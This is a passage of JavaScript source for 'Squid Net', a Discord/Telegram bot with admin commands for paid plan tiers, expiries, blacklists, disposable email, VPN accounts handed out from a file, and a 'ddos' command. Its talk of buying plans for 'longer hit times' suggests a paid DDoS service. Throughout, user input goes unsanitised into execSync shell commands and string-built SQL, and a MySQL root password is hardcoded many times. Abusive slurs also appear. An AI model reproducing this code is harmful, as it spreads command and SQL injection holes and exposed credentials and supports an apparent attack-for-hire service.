            encoding: 'utf-8'
          }); // the default is 'buffer'
          var string = `Blacklisted ${args[0]}`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        } else {
          var string = 'THE FUCK YOU TRYING TO DO CUNT?!'
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        break;
      }
      case 'unblacklist': {
        if (parseInt(row.admin) == 1) {
          var execSync = require('child_process').execSync;
          // import { execSync } from 'child_process';  // replace ^ if using ES modules
          var output = execSync(`sed -i 's/,${args[0]},/,/g' input.txt /root/bot/block.txt`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          var string = `Unblacklisted ${args[0]}`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        } else {
          var string = 'THE FUCK YOU TRYING TO DO CUNT?!'
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        break;
      }
      case 'forceplanupdates': {
        if (parseInt(row.admin) == 1) {
          let user = []
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          con.query(`select * from user where plan not like "0"`, (err, rows) => {
            if (err) throw err;
            var string = 'Forced Plan Update Success'
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            rows.forEach((row) => {
              var contents = row.expiry
              const parsed = parseInt(contents);
              if (contents < messageTime) {
                sql = `UPDATE user SET expiry ="000000" WHERE id ="${row.id}"`;
                con.query(sql)
                sql = `UPDATE user SET plan = '0' WHERE id = '${row.id}'`;
                con.query(sql)
              }
              var contents = row.expiry
              if (contents === "0") {
                sql = `UPDATE user SET expiry ="000000" WHERE id ="${row.id}"`;
                con.query(sql)
              }
            });
          });
        }
        break;
      };
      case 'godusers': {
        if (illegal === "true") {
          break;
        }
        if (parseInt(row.admin) == 1) {
          let user = []
          con.query(`SELECT * FROM user`, (err, rows) => {
            if (err) throw err;
            var string = 'Data received from database:'
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            rows.forEach((row) => {
              expiryFormat(row.id)
              if (row.plan === "69") {
                var plan = "GodMode";
                user.push(`[**${row.user}**] **${row.id}** **${plan}** expires **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`);
              } else {
                var plan = "No Plan";
              };
            });
            var string = user
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
          });
        } else {
          break;
        }
        break;
      };
      case 'planusers': {
        if (illegal === "true") {
          break;
        }
        if (parseInt(row.admin) == 1) {
          let user = []
          let user2 = []
          let user3 = []
          let user4 = []
          let user5 = []
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          let user1 = []
          var response = args.join(' ');
          var execSync = require('child_process').execSyn

          function countWords(str) {
            str = str.replace(/(^\s*)|(\s*$)/gi, "");
            str = str.replace(/[ ]{2,}/gi, " ");
            str = str.replace(/\n /, "\n");
            return str.split(' ').length;
          }
          var length = countWords(response);
          var minLength = 1
          if (length < minLength) {
            var string = `-------------------------------------------\n/planusers PAGE_NUMBER\n-------------------------------------------`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
          var page = 1;
          var [page] = args.toString().split(",");
          let getCount = page * 11;
          let i = 0;
          let limit = getCount - 1;
          con.query(`SELECT * FROM user WHERE plan > 0 LIMIT ${getCount}`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              if (parseInt(row.expiry) < messageTime) {
                sql = `UPDATE user SET plan = '0' WHERE id = '${row.id}'`;
                con.query(sql)
              } else {
                var contents = parseInt(row.expiry) - messageTime;
              }
              const parsed = parseInt(contents);
              if (isNaN(parsed)) {
                var h = 00
                var m = 00
                var s = 00
                var d = 00
              } else {
                var h = Math.floor(parseFloat(`${contents}`) / 1000 / 60 / 60);
                var m = Math.floor((parseFloat(`${contents}`) / 1000 / 60 / 60 - h) * 60);
                var s = Math.floor(((parseFloat(`${contents}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
                if (h < 24) {
                  var d = 0
                } else {
                  var d = parseInt(h / 24)
                  var h = h % 24;
                }
              }
              if (row.plan === "1") {
                var plan = "Copper Squid";
                user1.push(`[**${row.user}**] ${row.id} **${plan}** **D**: ${d} **H**: ${h} **M**: ${m} **S**: ${s}\n`);
              } else if (row.plan === "2") {
                var plan = "Aluminum  Squid";
                user1.push(`[**${row.user}**] ${row.id} **${plan}** **D**: ${d} **H**: ${h} **M**: ${m} **S**: ${s}\n`);
              } else if (row.plan === "3") {
                var plan = "Silver Squid";
                user1.push(`[**${row.user}**] ${row.id} **${plan}** **D**: ${d} **H**: ${h} **M**: ${m} **S**: ${s}\n`);
              } else if (row.plan === "4") {
                var plan = "Elite";
                user1.push(`[**${row.user}**] ${row.id} **${plan}** **D**: ${d} **H**: ${h} **M**: ${m} **S**: ${s}\n`);
              } else if (row.plan === "5") {
                var plan = "TR4P$QU1D";
                user1.push(`[**${row.user}**] ${row.id} **${plan}** **D**: ${d} **H**: ${h} **M**: ${m} **S**: ${s}\n`);
              } else if (row.plan === "6") {
                var plan = "Platinum Squid";
                user1.push(`[**${row.user}**] ${row.id} **${plan}** **D**: ${d} **H**: ${h} **M**: ${m} **S**: ${s}\n`);
              } else if (row.plan === "7") {
                var plan = "Gold Squid";
                user1.push(`[**${row.user}**] ${row.id} **${plan}** **D**: ${d} **H**: ${h} **M**: ${m} **S**: ${s}\n`);
              } else if (row.plan === "8") {
                var plan = "Emerald Squid";
                user1.push(`[**${row.user}**] ${row.id} **${plan}** **D**: ${d} **H**: ${h} **M**: ${m} **S**: ${s}\n`);
              } else if (row.plan === "9") {
                var plan = "Diamond Squid";
                user1.push(`[**${row.user}**] ${row.id} **${plan}** **D**: ${d} **H**: ${h} **M**: ${m} **S**: ${s}\n`);
              } else if (row.plan === "69") {
                var plan = "GodMode";
              } else {
                var plan = "No Plan";
              };
              i++;
              if (i > limit) {
                var users1 = user1.slice(1).slice(-8)
                var string = `${users1}`
                var embed = new Discord.MessageEmbed()
                  .setTitle(`Plan Users Page ${page}:`)
                  .setAuthor("Squid Net")
                  .setColor(0x00AE86)
                  .setDescription(`${string}`)
                  .setTimestamp()
                if (runningBot == "Discord") {
                  message.channel.send({
                    embed
                  })
                } else if (runningBot == "Telegram") {
                  bot.sendMessage(chatId, `${string}`);
                }
                return;
              }
            })
          });
        } else {
          break;
        }
        break;
      };
      case 'givespongebob': {
        if (parseInt(row.admin) == 1) {
          var expiry = null;
          var tag = message.author.tag;
          let user = []
          var plan1 = 0;
          var [usid1, plan1] = args.toString().split(",");
          var a = usid1.replace("<", "")
          var b = a.replace(">", "")
          var c = b.replace("@", "")
          var usid1 = c.replace("!", "")
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          if (plan1 === "1") {
            var ex = parseInt(messageTime) + parseInt(ExpT);
          }
          if (plan1 === "2") {
            var ex = parseInt(messageTime) + parseInt(ExpW);
          }
          if (plan1 === "3") {
            var ex = parseInt(messageTime) + parseInt(ExpM);
          }
          console.log(plan1)
          console.log(usid1)
          sql = `UPDATE user SET spongeAddOn = "${plan1}" WHERE id = "${usid1}"`;
          con.query(sql)
          sql = `UPDATE user SET spongeExpiry ="${ex}" WHERE id ="${usid1}"`;
          con.query(sql)
          var string = `User ID: **${usid1}**\nAdded: **${plan1}**`
          var embed = new Discord.MessageEmbed()
            .setTitle("Addon Changed:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        } else {
          break;
        }
        break;
      }
      case 'changeplan': {
        if (parseInt(row.admin) == 1) {
          var expiry = null;
          var tag = message.author.tag;
          let user = []
          var plan1 = 0;
          var response = args.join(' ');
          var [usid1, plan1] = args.toString().toLowerCase().split(",");
          console.log("test")
          console.log(usid1)
          console.log(plan1)
          var a = usid1.replace("<", "")
          var b = a.replace(">", "")
          var c = b.replace("@", "")
          var usid1 = c.replace("!", "")
          if (plan1 === "0") {
            var ex = 000000;
          }
          if (plan1 === "1") {
            var ex = parseInt(messageTime) + parseInt(ExpT);
          }
          if (plan1 === "2") {
            var ex = parseInt(messageTime) + parseInt(ExpW);
          }
          if (plan1 === "3") {
            var ex = parseInt(messageTime) + parseInt(ExpM);
          }
          if (plan1 === "4") {

          }
          if (plan1 === "5") {

          }
          if (plan1 === "6") {
            var ex = parseInt(messageTime) + parseInt(ExpR);
          }
          if (plan1 === "7") {
            var ex = parseInt(messageTime) + parseInt(ExpM);
          }
          if (plan1 === "8") {
            var ex = parseInt(messageTime) + parseInt(ExpM);
          }
          if (plan1 === "9") {
            var ex = parseInt(messageTime) + parseInt(ExpM);
          }
          sql = `UPDATE user SET expiry ="${ex}" WHERE id ="${usid1}"`;
          con.query(sql)
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          sql = `UPDATE user SET plan ="${plan1}" WHERE id ="${usid1}"`;
          con.query(sql)
          var string = `User ID: **${usid1}**\nNew Plan: **${plan1}**`
          var embed = new Discord.MessageEmbed()
            .setTitle("Plan Changed:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        } else {
          break;
        }
        break;
      }
      case 'increaseall': {
        if (parseInt(row.admin) == 1) {
          let user = []
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          var [length] = args.toString().split(",");
          if (length.includes("h")) {
            var new1 = length.replace("h", "")
            var length = parseInt(new1) * 3600000;
          } else if (length.includes("d")) {
            var new1 = length.replace("d", "")
            var length = parseInt(new1) * 86400000;
          } else if (length.includes("m")) {
            var new1 = length.replace("m", "")
            var length = parseInt(new1) * 2592000000;
          } else if (length.includes("y")) {
            var new1 = length.replace("y", "")
            var length = parseInt(new1) * 31556952000;
          }
          con.query(`SELECT * FROM user where plan > 0`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
                var ex = parseInt(row.expiry) + parseInt(length);
                sql = `UPDATE user SET expiry ="${ex}" WHERE id ="${row.id}"`;
                con.query(sql)
            });
          });
          message.channel.send("Success")
        } else {
          break;
        }
        break;
      };
      case 'increaseplan': {
        if (parseInt(row.admin) == 1) {
          let user = []
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          var response = args.join(' ');
          var [usid1, length] = args.toString().split(",");
          var a = usid1.replace("<", "")
          var b = a.replace(">", "")
          var c = b.replace("@", "")
          var usid1 = c.replace("!", "")
          if (length.includes("h")) {
            var new1 = length.replace("h", "")
            var length = parseInt(new1) * 3600000;
          } else if (length.includes("d")) {
            var new1 = length.replace("d", "")
            var length = parseInt(new1) * 86400000;
          } else if (length.includes("m")) {
            var new1 = length.replace("m", "")
            var length = parseInt(new1) * 2592000000;
          } else if (length.includes("y")) {
            var new1 = length.replace("y", "")
            var length = parseInt(new1) * 31556952000;
          }
          con.query(`SELECT * from user WHERE id ="${usid1}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var ex = parseInt(row.expiry) + parseInt(length);
              var exp = ex - messageTime;
              var d = "0";
              var h = "00";
              var m = "00";
              var s = "00";
              h = Math.floor(parseFloat(`${exp}`) / 1000 / 60 / 60);
              m = Math.floor((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60);
              s = Math.floor(((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
              if (h < 24) {} else {
                var d = parseInt(h / 24)
                var h = h % 24;
              }
              var string = `User ID: **${usid1}**\nNew Expiry: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
              var embed = new Discord.MessageEmbed()
                .setTitle("Expiry Extended:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
              sql = `UPDATE user SET expiry ="${ex}" WHERE id ="${usid1}"`;
              con.query(sql)
            });
          });
        } else {
          break;
        }
        break;
      }
      case 'decreaseplan': {
        if (parseInt(row.admin) == 1) {
          let user = []
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          var response = args.join(' ');
          var [usid1, length] = args.toString().split(",");
          console.log(usid1)
          if (length.includes("h")) {
            var new1 = length.replace("h", "")
            var length = parseInt(new1) * 3600000;
          } else if (length.includes("d")) {
            var new1 = length.replace("d", "")
            var length = parseInt(new1) * 86400000;
          } else if (length.includes("m")) {
            var new1 = length.replace("m", "")
            var length = parseInt(new1) * 2592000000;
          } else if (length.includes("y")) {
            var new1 = length.replace("y", "")
            var length = parseInt(new1) * 31556952000;
          }
          con.query(`SELECT * from user WHERE id ="${usid1}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var ex = parseInt(row.expiry) - parseInt(length);
              var exp = ex - messageTime;
              var d = "0";
              var h = "00";
              var m = "00";
              var s = "00";
              h = Math.floor(parseFloat(`${exp}`) / 1000 / 60 / 60);
              m = Math.floor((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60);
              s = Math.floor(((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
              if (h < 24) {} else {
                var d = parseInt(h / 24)
                var h = h % 24;
              }
              var string = `User ID: **${usid1}**\nNew Expiry: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
              var embed = new Discord.MessageEmbed()
                .setTitle("Expiry Decreased:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
              sql = `UPDATE user SET expiry ="${ex}" WHERE id ="${usid1}"`;
              con.query(sql)
            });
          });
          break;
        };
      }
      case 'increasesponge': {
        if (parseInt(row.admin) == 1) {
          let user = []
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          var response = args.join(' ');
          var [usid1, length] = args.toString().split(",");
          var a = usid1.replace("<", "")
          var b = a.replace(">", "")
          var c = b.replace("@", "")
          var usid1 = c.replace("!", "")
          if (length.includes("h")) {
            var new1 = length.replace("h", "")
            var length = parseInt(new1) * 3600000;
          } else if (length.includes("d")) {
            var new1 = length.replace("d", "")
            var length = parseInt(new1) * 86400000;
          } else if (length.includes("m")) {
            var new1 = length.replace("m", "")
            var length = parseInt(new1) * 2592000000;
          } else if (length.includes("y")) {
            var new1 = length.replace("y", "")
            var length = parseInt(new1) * 31556952000;
          }
          con.query(`SELECT * from user WHERE id ="${usid1}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var ex = parseInt(row.expiry) + parseInt(length);
              var exp = ex - messageTime;
              var d = "0";
              var h = "00";
              var m = "00";
              var s = "00";
              h = Math.floor(parseFloat(`${exp}`) / 1000 / 60 / 60);
              m = Math.floor((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60);
              s = Math.floor(((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
              if (h < 24) {} else {
                var d = parseInt(h / 24)
                var h = h % 24;
              }
              var string = `User ID: **${usid1}**\nNew Expiry: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
              var embed = new Discord.MessageEmbed()
                .setTitle("Expiry Extended:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
              sql = `UPDATE user SET SpongeExpiry ="${ex}" WHERE id ="${usid1}"`;
              con.query(sql)
            });
          });
        } else {
          break;
        }
        break;
      }
      case 'decreasesponge': {
        if (parseInt(row.admin) == 1) {
          let user = []
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          var response = args.join(' ');
          var [usid1, length] = args.toString().split(",");
          console.log(usid1)
          if (length.includes("h")) {
            var new1 = length.replace("h", "")
            var length = parseInt(new1) * 3600000;
          } else if (length.includes("d")) {
            var new1 = length.replace("d", "")
            var length = parseInt(new1) * 86400000;
          } else if (length.includes("m")) {
            var new1 = length.replace("m", "")
            var length = parseInt(new1) * 2592000000;
          } else if (length.includes("y")) {
            var new1 = length.replace("y", "")
            var length = parseInt(new1) * 31556952000;
          }
          con.query(`SELECT * from user WHERE id ="${usid1}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var ex = parseInt(row.expiry) - parseInt(length);
              var exp = ex - messageTime;
              var d = "0";
              var h = "00";
              var m = "00";
              var s = "00";
              h = Math.floor(parseFloat(`${exp}`) / 1000 / 60 / 60);
              m = Math.floor((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60);
              s = Math.floor(((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
              if (h < 24) {} else {
                var d = parseInt(h / 24)
                var h = h % 24;
              }
              var string = `User ID: **${usid1}**\nNew Expiry: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
              var embed = new Discord.MessageEmbed()
                .setTitle("Expiry Decreased:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
              sql = `UPDATE user SET SpongeExpiry ="${ex}" WHERE id ="${usid1}"`;
              con.query(sql)
            });
          });
          break;
        };
      }
      case 'suspend': {
        if (parseInt(row.admin) == 1) {
          let user = []
          var con = mysql.createConnection({
            host: "localhost",
            user: "root",
            password: "fuckingpeopleover",
            timeout: 6000000,
            database: "bot"
          });
          var [usid1, length] = args.toString().split(",");
          var a = usid1.replace("<", "")
          var b = a.replace(">", "")
          var c = b.replace("@", "")
          var usid1 = c.replace("!", "")
          if (length.includes("h")) {
            var new1 = length.replace("h", "")
            var length = parseInt(new1) * 3600000;
          } else if (length.includes("d")) {
            var new1 = length.replace("d", "")
            var length = parseInt(new1) * 86400000;
          } else if (length.includes("m")) {
            var new1 = length.replace("m", "")
            var length = parseInt(new1) * 2592000000;
          } else if (length.includes("y")) {
            var new1 = length.replace("y", "")
            var length = parseInt(new1) * 31556952000;
          }
          con.query(`SELECT * from user WHERE id ="${usid1}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              var ex = messageTime + parseInt(length);
              var exp = ex - messageTime;
              var d = "0";
              var h = "00";
              var m = "00";
              var s = "00";
              h = Math.floor(parseFloat(`${exp}`) / 1000 / 60 / 60);
              m = Math.floor((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60);
              s = Math.floor(((parseFloat(`${exp}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
              if (h < 24) {} else {
                var d = parseInt(h / 24)
                var h = h % 24;
              }
              var string = `User ID: **${usid1}**\nAccess Returned in: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
              var embed = new Discord.MessageEmbed()
                .setTitle("Cooldown set:")
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
              sql = `UPDATE user SET globalCooldown ="${ex}" WHERE id ="${usid1}"`;
              con.query(sql)
            });
          });
        } else {
          break;
        }
        break;
      }
      case 'urlhaus': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`curl -s https://urlhaus.abuse.ch/downloads/text/ 2>&1 | grep ${response} | tail -2000`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var contents = output;
        if (contents.length > 1990) {
          var contents = contents.slice(contents.length - 1990)
        }
        var string = `${contents}`
        var embed = new Discord.MessageEmbed()
          .setTitle("URLHAUS SEARCH")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'ascii': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`figlet ${response}`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var contents = output;
        if (contents.length > 1990) {
          var contents = contents.slice(contents.length - 1990)
        }
        message.channel.send(`\`\`\`yaml\n${contents}\`\`\``)
        break;
      }
      case 'mailnew': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        const output = execSync(`curl https://www.1secmail.com/api/v1/?action=genRandomMailbox\&count=1`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var contents = output;
        if (contents.length > 1990) {
          var contents = contents.slice(contents.length - 1990)
        }
        var string = `This is your new email: ${contents}`
        var embed = new Discord.MessageEmbed()
          .setTitle("Free Email")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'mailinbox': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var data = response.replace("@", "\\&domain=")
        var execSync = require('child_process').execSync;
        console.log(`curl https://www.1secmail.com/api/v1/?action=getMessages\&login=${data}`)
        const output = execSync(`curl https://www.1secmail.com/api/v1/?action=getMessages\\&login=${data}`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var contents = output;
        if (contents.length > 1990) {
          var contents = contents.slice(contents.length - 1990)
        }
        var filter = contents.replace(/,/g, "\n");
        var o = filter.replace(/\"/g, "");
        var p = o.replace(/\{/g, "");
        var q = p.replace(/\}/g, "");
        var r = q.replace(/\[/g, "")
        var s = r.replace(/\]/g, "")
        var t = s.replace(/:/g, ": ");
        var contents = t.replace(":", ": ");
        var string = `**Inbox**:\n${contents}\n\n`
        var embed = new Discord.MessageEmbed()
          .setTitle("Free Email")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'mailread': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var [email, id] = args.toString().toLowerCase().split(",");
        var data = email.replace("@", "\\&domain=")
        var execSync = require('child_process').execSync;
        console.log(`curl https://www.1secmail.com/api/v1/?action=readMessage\\&login=${data}\\&id=${id}`)
        const output = execSync(`curl https://www.1secmail.com/api/v1/?action=readMessage\\&login=${data}\\&id=${id}`, {
          encoding: 'utf-8'
        }); // the default is 'buffer'
        var contents = output;
        if (contents.length > 1990) {
          var contents = contents.slice(contents.length - 1990)
        }
        var filter = contents.replace(/,/g, "\n");
        var o = filter.replace(/\"/g, "");
        var p = o.replace(/\{/g, "");
        var q = p.replace(/\}/g, "");
        var r = q.replace(/\[/g, "")
        var s = r.replace(/\]/g, "")
        var t = s.replace(/:/g, ": ");
        var contents = t.replace(":", ": ");
        var string = `**Inbox**:\n${contents}\n\n`
        var embed = new Discord.MessageEmbed()
          .setTitle("Free Email")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'vpn': {
        if (illegal === "true") {
          break;
        }

        function vpnSend() {
          var execSync = require('child_process').execSync;
          const output = execSync(`sed -n 1p accounts/vpn.txt`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          const output1 = execSync(`sed -i 1d accounts/vpn.txt`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          var string = `Please check your dms`
          var embed = new Discord.MessageEmbed()
            .setTitle("Account sent!")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          var string = `Heres your shitty account: **${output}**`
          if (runningBot == "Discord") {
            message.author.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        }
        if (row.plan === "0") {
          console.log("Test")
          con.query(`SELECT * FROM coolDowns WHERE id ="${user}"`, (err, rows) => {
            if (err) throw err;
            if (rows.length < 1) {
              vpnSend();
            }
            rows.forEach((row) => {
              console.log(row.vpn, messageTime)
              if (parseInt(row.vpn) > Number(messageTime)) {
                var a1 = parseInt(`${row.vpn}`) - parseInt(`${messageTime}`)
                var h = 00
                var m = 00
                var s = 00
                var d = 00
                var h = Math.floor(parseInt(`${a1}`) / 1000 / 60 / 60);
                var m = Math.floor((parseInt(`${a1}`) / 1000 / 60 / 60 - h) * 60);
                var s = Math.floor(((parseInt(`${a1}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
                if (h < 24) {
                  var d = 0
                } else {
                  var d = parseInt(h / 24)
                  var h = h % 24;
                }
                var string = `**Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}\n Buy a plan to get longer hit times and too remove cooldowns!`
                var embed = new Discord.MessageEmbed()
                  .setTitle("You can use this again in:")
                  .setAuthor("Squid Net")
                  .setColor(0x089FEF)
                  .setDescription(`${string}`)
                  .setTimestamp()
                if (runningBot == "Discord") {
                  message.channel.send({
                    embed
                  })
                } else if (runningBot == "Telegram") {
                  bot.sendMessage(chatId, `${string}`);
                }
                return;
              } else {
                vpnSend();
              }
            });
          });
          var conexpire = 900000 + Number(messageTime);
          con.query(`SELECT * FROM coolDowns WHERE id = "${user}"`, (err, rows) => {
            if (err) throw err;
            if (rows.length < 1) {
              con.query(`INSERT INTO coolDowns (id, vpn) VALUES ("${user}", "${conexpire}")`)
            } else {
              con.query(`UPDATE coolDowns SET vpn ="${conexpire}" WHERE id ="${user}"`)
            }
          });
        } else {
          vpnSend();
        }
        break;
      }
      case 'ddos': {
        if (illegal === "true") {
          break;
        }
        var string = "do /peen"
        var embed = new Discord.MessageEmbed()
          .setTitle("Bad word!")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'myth': {
        if (illegal === "true") {
          break;
        }
        var string = "**JUST IN!**\nMyth Says you a bitch ass hoe."
        var embed = new Discord.MessageEmbed()
          .setTitle("Breaking News!")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'say': {
        if (parseInt(row.admin) == 1) {
          if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `Tf u this is discord only wth`);
          }
          var a = ""
          var b = ""
          var c = ""
          var d = ""
          var e = ""
          var f = ""
          var g = ""
          var h = ""
          var i = ""
          var j = ""
          var k = ""
          var l = ""
          var m = ""
          var n = ""
          var o = ""
          var p = ""
          var q = ""
          var r = ""
          var s = ""
          var t = ""
          var u = ""
          var [channel, title, a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u] = args.toString().split(",");
          if (a == null) {
            var a = "";
          }
          if (b == null) {
            var b = "";
          }
          if (c == null) {
            var c = "";
          }
          if (d == null) {
            var d = "";
          }
          if (e == null) {
            var e = "";
          }
          if (f == null) {
            var f = "";
          }
          if (g == null) {
            var g = "";
          }
          if (h == null) {
            var h = "";
          }
          if (i == null) {
            var i = "";
          }
          if (j == null) {
            var j = "";
          }
          if (k == null) {
            var k = "";
          }
          if (l == null) {
            var l = "";
          }
          if (m == null) {
            var m = "";
          }
          if (n == null) {
            var n = "";
          }
          if (o == null) {
            var o = "";
